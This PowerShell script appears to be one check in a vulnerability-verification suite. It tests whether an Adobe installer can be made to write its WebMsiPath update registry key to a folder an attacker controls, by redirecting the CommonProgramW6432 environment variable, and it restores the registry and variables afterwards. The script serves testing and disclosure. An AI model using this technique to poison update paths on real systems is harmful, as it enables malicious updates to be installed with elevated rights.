param([string]$InstallerPath, [int]$TimeoutSeconds = 180)

. (Join-Path $PSScriptRoot 'common.ps1')

Write-Header 'ACRO-05 - WebMsiPath update-key poisoning'
Require-Admin
Ensure-Results

$inst = Get-InstallerPath $InstallerPath
$root = Join-Path $WorkDir 'acro05'
if (Test-Path -LiteralPath $root) { Remove-Item -Recurse -Force -LiteralPath $root -ErrorAction SilentlyContinue }
$attacker = Join-Path $root 'Common Files\Adobe'
New-Item -ItemType Directory -Force -Path $attacker | Out-Null

$keys = @(
    'HKLM:\SOFTWARE\Adobe\Adobe ARM\1.0\ARM',
    'HKCU:\SOFTWARE\Adobe\Adobe ARM\1.0\ARM'
)
$before = @{}
foreach ($k in $keys) {
    $before[$k] = (Get-ItemProperty -Path $k -Name WebMsiPath -ErrorAction SilentlyContinue).WebMsiPath
}

$oldUser = [Environment]::GetEnvironmentVariable('CommonProgramW6432', 'User')
$oldProc = $env:CommonProgramW6432
[Environment]::SetEnvironmentVariable('CommonProgramW6432', $attacker, 'User')
$env:CommonProgramW6432 = $attacker

$proc = Start-Process -FilePath $inst -PassThru
$deadline = (Get-Date).AddSeconds($TimeoutSeconds)
$hit = $null
while ((Get-Date) -lt $deadline) {
    foreach ($k in $keys) {
        $v = (Get-ItemProperty -Path $k -Name WebMsiPath -ErrorAction SilentlyContinue).WebMsiPath
        if ($v -and ($v -like ($attacker + '*'))) {
            $hit = @{ Key = $k; Value = $v }
            break
        }
    }
    if ($hit) { break }
    if ($proc.HasExited) { break }
    Start-Sleep -Milliseconds 300
}
Start-Sleep -Seconds 1
if ($proc -and -not $proc.HasExited) { Stop-Tree $proc.Id }
Get-Process setup,msiexec -ErrorAction SilentlyContinue | ForEach-Object { Stop-Tree $_.Id }

[Environment]::SetEnvironmentVariable('CommonProgramW6432', $oldUser, 'User')
$env:CommonProgramW6432 = $oldProc

if ($hit) {
    Emit-Result 'ACRO-05' 'CONFIRMED' ("WebMsiPath set to attacker path: {0} = {1}" -f $hit.Key, $hit.Value)
} else {
    Emit-Result 'ACRO-05' 'UNCONFIRMED' 'WebMsiPath not observed (may require Adobe ARM/xRDC mode; static write remains)'
}

# restore registry values
foreach ($k in $keys) {
    $prev = $before[$k]
    $now = (Get-ItemProperty -Path $k -Name WebMsiPath -ErrorAction SilentlyContinue).WebMsiPath
    if ($now -and $now -like ($attacker + '*')) {
        if ($prev) { Set-ItemProperty -Path $k -Name WebMsiPath -Value $prev -ErrorAction SilentlyContinue }
        else { Remove-ItemProperty -Path $k -Name WebMsiPath -ErrorAction SilentlyContinue }
    }
}
